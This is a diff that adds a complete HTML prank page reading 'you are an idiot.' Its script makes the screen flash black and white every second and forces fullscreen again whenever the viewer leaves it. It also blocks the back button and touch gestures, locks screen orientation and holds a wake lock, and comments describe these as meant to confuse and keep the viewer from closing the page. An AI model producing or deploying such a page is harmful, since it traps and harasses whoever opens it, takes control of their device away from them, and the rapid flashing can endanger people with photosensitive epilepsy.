@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>you are an idiot</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    width: 100%; height: 100%;
+    background: white;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    overflow: hidden;
+    font-family: 'Times New Roman', Times, serif;
+    touch-action: none;
+    -webkit-user-select: none;
+    user-select: none;
+  }
+  body.black { background: black; }
+  body.black #text { color: white; }
+  body.black .face circle,
+  body.black .face path { stroke: white; }
+  body.black .face circle.dot { fill: white; stroke: none; }
+  #text {
+    font-size: clamp(32px, 8vw, 96px);
+    color: black;
+    margin-bottom: 48px;
+  }
+  #faces {
+    display: flex;
+    gap: clamp(20px, 5vw, 64px);
+    align-items: center;
+  }
+  .face {
+    width: clamp(60px, 12vw, 120px);
+    height: clamp(60px, 12vw, 120px);
+  }
+</style>
+</head>
+<body>
+<div id="text">you are an idiot.</div>
+<div id="faces">
+  <svg class="face" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="50" cy="50" r="45" fill="none" stroke="black" stroke-width="3.5"/>
+    <circle class="dot" cx="36" cy="40" r="5.5" fill="black"/>
+    <circle class="dot" cx="64" cy="40" r="5.5" fill="black"/>
+    <path d="M 28 63 Q 50 82 72 63" fill="none" stroke="black" stroke-width="3.5" stroke-linecap="round"/>
+  </svg>
+  <svg class="face" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="50" cy="50" r="45" fill="none" stroke="black" stroke-width="3.5"/>
+    <circle class="dot" cx="36" cy="40" r="5.5" fill="black"/>
+    <circle class="dot" cx="64" cy="40" r="5.5" fill="black"/>
+    <path d="M 28 63 Q 50 82 72 63" fill="none" stroke="black" stroke-width="3.5" stroke-linecap="round"/>
+  </svg>
+  <svg class="face" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="50" cy="50" r="45" fill="none" stroke="black" stroke-width="3.5"/>
+    <circle class="dot" cx="36" cy="40" r="5.5" fill="black"/>
+    <circle class="dot" cx="64" cy="40" r="5.5" fill="black"/>
+    <path d="M 28 63 Q 50 82 72 63" fill="none" stroke="black" stroke-width="3.5" stroke-linecap="round"/>
+  </svg>
+</div>
+<script>
+  // Fullscreen
+  var el = document.documentElement;
+  if (el.requestFullscreen) el.requestFullscreen();
+  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+  // Flash black/white every second
+  setInterval(function() {
+    document.body.classList.toggle('black');
+  }, 1000);
+
+  // Re-request fullscreen if they escape it (desktop)
+  document.addEventListener('fullscreenchange', function() {
+    if (!document.fullscreenElement) {
+      setTimeout(function() {
+        if (el.requestFullscreen) el.requestFullscreen();
+      }, 300);
+    }
+  });
+  document.addEventListener('webkitfullscreenchange', function() {
+    if (!document.webkitFullscreenElement) {
+      setTimeout(function() {
+        if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      }, 300);
+    }
+  });
+
+  // Mobile: lock screen orientation to landscape and portrait alternately to confuse
+  if (screen.orientation && screen.orientation.lock) {
+    screen.orientation.lock('portrait').catch(function(){});
+  }
+
+  // Block back gesture / history navigation
+  history.pushState(null, '', location.href);
+  window.addEventListener('popstate', function() {
+    history.pushState(null, '', location.href);
+  });
+
+  // Prevent touch gestures used to close/swipe away
+  document.addEventListener('touchstart', function(e) { e.preventDefault(); }, { passive: false });
+  document.addEventListener('touchmove', function(e) { e.preventDefault(); }, { passive: false });
+  document.addEventListener('touchend', function(e) { e.preventDefault(); }, { passive: false });
+
+  // Keep requesting fullscreen on any interaction
+  document.addEventListener('click', function() {
+    if (el.requestFullscreen) el.requestFullscreen();
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+  });
+  document.addEventListener('touchstart', function() {
+    if (el.requestFullscreen) el.requestFullscreen();
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+  }, { passive: false });
+
+  // Wake lock to keep screen on
+  if ('wakeLock' in navigator) {
+    navigator.wakeLock.request('screen').catch(function(){});
+  }
+</script>
+</body>
+</html>
